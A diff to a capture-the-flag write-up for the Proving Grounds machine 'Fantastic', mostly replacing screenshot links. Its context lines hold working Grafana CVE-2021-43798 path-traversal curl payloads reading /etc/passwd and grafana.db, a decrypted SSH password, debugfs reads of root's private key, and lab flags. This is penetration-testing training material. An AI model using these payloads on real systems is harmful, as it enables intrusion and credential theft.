@@ -1,9 +1,13 @@
 # Fantastic(linux) — Proving Grounds Writeup
 
 **Platform:** Proving Grounds Practice
+
 **OS:** Linux (Ubuntu)
+
 **Difficulty:** Easy
+
 **Job Role:** Junior Penetration Tester
+
 **Tags:** Grafana CVE-2021-43798 · SQLite Database Analysis · AES Decryption · Disk Group Abuse · debugfs Privilege Escalation
 
 ---
@@ -45,9 +49,8 @@
 nmap -sC -sV -sS -A -T5 -p- -Pn 192.168.156.181
 ```
 
-**Screenshot — Nmap Scan Results:**
+<img width="1597" height="812" alt="image" src="https://github.com/user-attachments/assets/7da30183-5e56-4086-98fe-75f3e9ce98f6" />
 
-![Nmap Scan](screenshots/nmap_scan.png)
 
 **Ports Discovered:**
 
@@ -70,9 +73,8 @@ nmap -sC -sV -sS -A -T5 -p- -Pn 192.168.156.181
 
 Navigating to `http://192.168.156.181:3000` reveals a **Grafana** login page.
 
-**Screenshot — Grafana Login Page (Port 3000):**
+<img width="1538" height="838" alt="image" src="https://github.com/user-attachments/assets/86066fce-1eca-4c3c-b33d-6bd30cdd00a8" />
 
-![Grafana Login](screenshots/grafana_login.png)
 
 The Grafana footer reveals the version: **v8.3.0 (1f1eb021)**
 
@@ -98,9 +100,8 @@ The vulnerability exists in the `/public/plugins/<plugin-name>/` endpoint. By us
 curl http://192.168.156.181:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
 ```
 
-**Screenshot — /etc/passwd via Path Traversal:**
+<img width="931" height="776" alt="image" src="https://github.com/user-attachments/assets/139a2ded-67a6-418e-a1f1-1c78771e0327" />
 
-![/etc/passwd Leaked](screenshots/etc_passwd.png)
 
 **Key Users Identified:**
 
@@ -119,9 +120,8 @@ prometheus:x:1000:1000::/home/prometheus:/bin/false
 curl http://192.168.156.181:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fshare%2Fgrafana%2Fconf%2Fdefaults.ini
 ```
 
-**Screenshot — Grafana Config Defaults Leaked:**
+<img width="1610" height="800" alt="image" src="https://github.com/user-attachments/assets/938c8027-568f-4709-bbb3-07f0619cddd2" />
 
-![Grafana Config](screenshots/grafana_defaults_ini.png)
 
 The config reveals the default data path as `data = data`, confirming the SQLite database location at `/var/lib/grafana/grafana.db`.
 
@@ -132,9 +132,8 @@ curl http://192.168.156.181:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F.
   --output grafana.db
 ```
 
-**Screenshot — grafana.db Downloaded:**
+<img width="1663" height="155" alt="image" src="https://github.com/user-attachments/assets/450a16e2-71bb-456f-9c54-2f5424d9f532" />
 
-![Grafana DB Download](screenshots/grafana_db_download.png)
 
 Verify the file:
 
@@ -158,9 +157,8 @@ sqlite3 grafana.db
 sqlite> SELECT * FROM data_source;
 ```
 
-**Screenshot — SQLite Browser Showing Encrypted Password:**
+<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/5747d298-97f1-4841-8f66-f9173e0aaf98" />
 
-![SQLite Browser](screenshots/sqlite_browser.png)
 
 **Encrypted credential found in `data_source` table:**
 
@@ -181,9 +179,8 @@ pip install requests questionary termcolor cryptography
 python3 decrypt.py
 ```
 
-**Screenshot — Grafana Decryptor Output:**
+<img width="1689" height="419" alt="image" src="https://github.com/user-attachments/assets/407f307a-1fcb-4650-a3ea-eb5cc9184d24" />
 
-![Password Decrypted](screenshots/grafana_decrypt.png)
 
 ```
 [*] DataSourcePassword: anBneWFNQ2z+IDGhz3a7wxaqjimuglSXTeMvhbvsveZwVzreNJSw+hsV4w==
@@ -208,9 +205,8 @@ ssh sysadmin@192.168.156.181
 # Password: SuperSecureP@ssw0rd
 ```
 
-**Screenshot — SSH Shell as sysadmin:**
+<img width="856" height="635" alt="image" src="https://github.com/user-attachments/assets/31a52b65-05aa-488f-adc6-52e0f5bd10b6" />
 
-![SSH Access](screenshots/ssh_initial_access.png)
 
 ```
 Welcome to Ubuntu 20.04.19 LTS (GNU/Linux 5.14.0-1 generic x86_64)
@@ -235,9 +231,8 @@ chmod +x linpeas.sh
 ./linpeas.sh
 ```
 
-**Screenshot — Linpeas Disk Group Finding:**
+<img width="719" height="110" alt="image" src="https://github.com/user-attachments/assets/98c71985-14c7-4986-945b-363ed15430f6" />
 
-![Linpeas Disk Group](screenshots/linpeas_disk_group.png)
 
 **Critical Finding from Linpeas:**
 
@@ -257,9 +252,8 @@ id=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin),6(disk)
 df -h
 ```
 
-**Screenshot — Disk Space & Partition Layout:**
+<img width="1124" height="718" alt="image" src="https://github.com/user-attachments/assets/e00407e0-7b8f-4c03-976d-fe58e245b688" />
 
-![df -h output](screenshots/df_h.png)
 
 ```
 Filesystem      Size  Used Avail Use% Mounted on
@@ -279,9 +273,8 @@ debugfs 1.45.5 (07-Jan-2020)
 debugfs: cat /root/.ssh/id_rsa
 ```
 
-**Screenshot — Root SSH Private Key via debugfs:**
+<img width="1098" height="760" alt="image" src="https://github.com/user-attachments/assets/cde208be-e3e4-4c58-b14c-a512e26b11d4" />
 
-![debugfs SSH Key](screenshots/debugfs_id_rsa.png)
 
 The full RSA private key is displayed. Copy the entire key output.
 
@@ -298,9 +291,8 @@ chmod 600 id_rsa
 ssh root@192.168.156.181 -i id_rsa
 ```
 
-**Screenshot — SSH as Root Using Extracted Key:**
+<img width="621" height="96" alt="image" src="https://github.com/user-attachments/assets/bdb9816b-b621-4091-997c-a2170bfe9fd6" />
 
-![Root SSH Login](screenshots/root_ssh_login.png)
 
 ```
 Last login: Tue Mar  1 18:46:45 2022
@@ -322,9 +314,8 @@ sysadmin@fanatastic:~$ cat local.txt
 d12d2f71594b2ed1b7987861b1d556e8
 ```
 
-**Screenshot — local.txt:**
+<img width="837" height="337" alt="image" src="https://github.com/user-attachments/assets/4a4fc5ea-aa92-4a55-9ad8-56579a5831fa" />
 
-![local.txt](screenshots/local_txt.png)
 
 ### proof.txt
 
@@ -335,9 +326,8 @@ root@fanatastic:~# cat proof.txt
 12c2e35a88de074c9ceede34e1064e47
 ```
 
-**Screenshot — proof.txt:**
+<img width="675" height="206" alt="image" src="https://github.com/user-attachments/assets/18c34047-6650-4404-9b0e-82fd425ff38d" />
 
-![proof.txt](screenshots/proof_txt.png)
 
 ---
 
@@ -472,5 +462,5 @@ Target: 192.168.156.181
 ---
 
 **Platform:** OffSec Proving Grounds Practice
-**Author:** Tanvir Ahmed | [tanvirkarim.it](https://tanvirkarim.it)
-**GitHub:** [github.com/Tanvir-2](https://github.com/Tanvir-2)
+
+**Author:** Tanvir Ahmed
